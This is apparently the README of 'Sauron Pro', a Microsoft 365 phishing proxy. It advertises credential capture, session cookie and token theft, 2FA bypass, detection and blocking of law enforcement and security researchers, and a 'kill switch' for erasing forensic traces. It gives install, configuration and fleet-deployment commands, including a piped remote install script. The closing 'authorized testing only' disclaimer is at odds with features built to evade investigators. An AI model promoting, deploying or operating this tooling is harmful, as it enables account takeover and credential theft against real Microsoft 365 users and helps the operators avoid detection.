# Sauron Pro - Advanced Microsoft 365 MITM Proxy

[![Release](https://img.shields.io/github/v/release/Skillz147/Sauron-Pro)](https://github.com/Skillz147/Sauron-Pro/releases)
[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![Documentation](https://img.shields.io/badge/docs-available-brightgreen.svg)](https://skillz147.github.io/Sauron-Pro)

Professional-grade Microsoft 365 login flow interception for authorized security testing, credential capture, and session harvesting with enterprise-level infrastructure capabilities.

---

## ✨ Key Features

🔐 **Credential Capture** - Real-time username/password interception  
🍪 **Session Harvesting** - Microsoft authentication cookies and tokens  
🔓 **2FA Bypass** - Multi-factor authentication token capture  
📊 **Live Monitoring** - WebSocket dashboard for real-time operations  
🌐 **SSL Automation** - Automatic HTTPS certificates via Let's Encrypt  
🚀 **Fleet Management** - Centralized control of multiple VPS instances  
🔍 **Victim Monitoring** - Advanced law enforcement detection system  
🔴 **Kill Switch** - Emergency VPS destruction with forensic evasion  
🛡️ **Access Protection** - Smart redirect system blocks unauthorized visitors  
🗂️ **Path Agnostic** - Install from any directory location with dynamic configuration

---

## 🆕 Recent Updates (August 2025)

### 🛡️ Unauthorized Access Protection

- **Smart Redirect System**: Automatically redirects visitors without valid slugs to real Microsoft services
- **Reconnaissance Protection**: Blocks security researchers and automated scanners
- **Stealth Operation**: Maintains legitimate appearance for unauthorized visitors
- **Advanced Logging**: Comprehensive tracking of unauthorized access attempts

### 🗂️ Path-Agnostic Installation  

- **Location Flexibility**: Install from any directory (`/root/sauron`, `/opt/sauron`, `/home/user/sauron`)
- **Dynamic Services**: systemd files automatically configured for installation path
- **Certificate Portability**: Multiple fallback paths for SSL certificate loading
- **Universal Updates**: Update system works regardless of installation location

### 🔧 Infrastructure Improvements

- **systemd Reliability**: Fixed hardcoded path issues in service files
- **Certificate Resilience**: Enhanced SSL loading with multiple fallback locations
- **Update Robustness**: Smart path detection for seamless updates
- **Deployment Versatility**: Support for any user account and directory structure

---

## 🚀 Installation

### Requirements

- Ubuntu 20.04+ VPS with root access
- Domain name (any registrar)
- Cloudflare account (free tier)
- Firebase project with Firestore enabled

### Option 1: One-Command Installation

```bash
# Download and auto-install
wget -O - https://raw.githubusercontent.com/Skillz147/Sauron-Pro/main/install.sh | sudo bash
```

### Option 2: Manual Installation

```bash
# Download latest release
wget https://github.com/Skillz147/Sauron-Pro/releases/latest/download/sauron-linux-amd64.tar.gz
tar -xzf sauron-linux-amd64.tar.gz && cd sauron

# Add Firebase Admin SDK key (from Firebase Console)
cp /path/to/firebaseAdmin.json .

# Install and configure
sudo ./install-production.sh
```

---

## 🎯 Usage & Access

### Access Points

- **Admin Panel**: `https://yourdomain.com/admin`
- **Operations**: `https://login.yourdomain.com/your-slug`
- **Monitoring**: `https://yourdomain.com/stats`

### Quick Help

```bash
# Get complete help and system status
./help.sh
```

---

## ⚙️ Configuration

### Interactive Setup

```bash
# Run configuration wizard
./configure-env.sh

# Configuration options
./configure-env.sh --status     # Show current status
./configure-env.sh --check      # Validate configuration
./configure-env.sh --test-domain # Test domain connectivity
./configure-env.sh --check-ssl  # Check SSL certificates
```

### Manual Configuration

Edit `.env` file with your settings:

```bash
ADMIN_KEY=your_secure_64_character_admin_key_here
SAURON_DOMAIN=securelogin365.com
CLOUDFLARE_API_TOKEN=your_token_here
TURNSTILE_SECRET=your_secret_here
```

---

## 🔧 System Management

### Service Control

```bash
# Service operations
sudo systemctl status sauron    # Check service status
sudo systemctl restart sauron   # Restart service
sudo systemctl stop sauron      # Stop service

# View logs
sudo journalctl -u sauron -f    # Live service logs
tail -f logs/system.log         # System logs
tail -f logs/emits.log          # Capture logs
```

### System Operations

```bash
# System verification
./verify-installation.sh        # Full system check
./test-firebase.sh              # Test Firebase connectivity

# Updates
sudo ./update-sauron.sh --check # Check for updates
sudo ./update-sauron.sh --force # Install updates

# Version info
/usr/local/bin/sauron --version # Check version
```

---

## 🆘 Troubleshooting

### Quick Diagnostics

```bash
# System status check
sudo systemctl status sauron && echo "✅ Service OK" || echo "❌ Service FAILED"

# Network connectivity
dig yourdomain.com              # DNS resolution
curl -I https://yourdomain.com  # Domain connectivity
```

### Common Issues

#### 🔴 Service won't start

```bash
# Check service status and logs
sudo systemctl status sauron
sudo journalctl -u sauron --no-pager -l

# Verify installation
./verify-installation.sh

# Check configuration
./configure-env.sh --check
```

#### 🔴 Domain not reachable

```bash
# Test DNS resolution
dig yourdomain.com

# Verify domain points to your server
curl -I https://yourdomain.com

# Check Cloudflare configuration
./configure-env.sh --test-domain
```

#### 🔴 SSL certificate issues

```bash
# Check certificate status
./configure-env.sh --check-ssl

# Manual certificate renewal
sudo acme.sh --renew -d yourdomain.com

# View certificate logs
sudo journalctl -u acme.sh -f
```

#### 🔴 Firebase connection issues

```bash
# Test Firebase connectivity
./test-firebase.sh

# Check Firebase credentials file
ls -la firebaseAdmin.json

# Verify Firestore logs
grep -i "firebase\|firestore" logs/system.log
```

**If firebaseAdmin.json is missing:**

1. Go to [Firebase Console](https://console.firebase.google.com)
2. Select your project → Project Settings → Service Accounts
3. Generate new private key → Download as firebaseAdmin.json
4. Upload to your server's sauron directory

---

## 🏗️ Advanced Features

### Fleet Management

Deploy and control multiple VPS instances from a central master:

#### Interactive Configuration (Recommended)

```bash
# Configure fleet master interactively
sudo ./scripts/fleet-master.sh

# Configure VPS agent interactively
sudo ./scripts/fleet-agent.sh
```

#### Manual Configuration (Advanced)

```bash
# Deploy master controller manually
export DOMAIN=master.example.com && sudo ./deploy-fleet-master.sh

# Deploy VPS agents manually  
export MASTER_URL=https://master.example.com:8443 && sudo ./deploy-vps-agent.sh
```

#### Fleet Management Commands

```bash
/opt/sauron-pro/bin/fleet-status                    # View all VPS instances
/opt/sauron-pro/bin/fleet-command vps-001 status    # Send commands to specific VPS
/opt/sauron-pro/bin/fleet-command vps-001 restart   # Restart specific VPS
```

### Victim Monitoring System

Advanced law enforcement detection with automatic blocking:

- Government email detection (`.gov`, `.mil`)
- Law enforcement IP range monitoring
- Automated tool signature detection
- Real-time threat classification and response

### Kill Switch System

Emergency VPS destruction with 5-stage annihilation:

- Memory purge and data obliteration
- System corruption and hardware destruction
- Dead man's switch with automatic failsafe
- Zero forensic trace protocols

---

## 🛠️ Development

```bash
# Build binary release package
./scripts/build-release.sh

# Build with specific version
./scripts/build-release.sh v2025.08.15-custom

# Deploy to production server
./scripts/deploy-production.sh
```

---

## 🚫 Uninstallation

```bash
# Complete removal command
sudo systemctl stop sauron.service 2>/dev/null; sudo systemctl disable sauron.service 2>/dev/null; sudo rm -f /etc/systemd/system/sauron.service; sudo rm -f /usr/local/bin/sauron*; sudo rm -rf /opt/sauron /var/lib/sauron /etc/sauron /home/sauron /root/sauron /tmp/sauron*; sudo pkill -f sauron 2>/dev/null; sudo systemctl daemon-reload; echo "✅ Sauron removed!"
```

---

## 📚 Documentation

| Guide | Description |
|-------|-------------|
| [Setup Guide](https://skillz147.github.io/Sauron-Pro/setup-guide.html) | Complete installation walkthrough |
| [Victim Monitoring](https://skillz147.github.io/Sauron-Pro/victim-monitoring.html) | LE detection system |
| [Fleet Management](https://skillz147.github.io/Sauron-Pro/fleet-management.html) | Multi-VPS control |
| [Kill Switch](https://skillz147.github.io/Sauron-Pro/kill-switch.html) | Emergency procedures |
| [API Reference](https://skillz147.github.io/Sauron-Pro/admin-api.html) | Administrative endpoints |

**📖 [Complete Documentation](https://skillz147.github.io/Sauron-Pro)**

---

## ⚠️ Legal Disclaimer

### FOR AUTHORIZED SECURITY TESTING ONLY

This software is intended exclusively for:

- Authorized penetration testing
- Educational security research  
- Legitimate security assessments

**Requirements:**

- Explicit written permission from target system owners
- Compliance with all applicable laws and regulations
- Responsible disclosure of discovered vulnerabilities

**The authors disclaim all liability for unauthorized or illegal use.**

---

## 📄 License

MIT License with Security Tool Disclaimers - see [LICENSE](LICENSE) for details.

---

**🔗 [Documentation](https://skillz147.github.io/Sauron-Pro) • [Releases](https://github.com/Skillz147/Sauron-Pro/releases) • [Issues](https://github.com/Skillz147/Sauron-Pro/issues)**
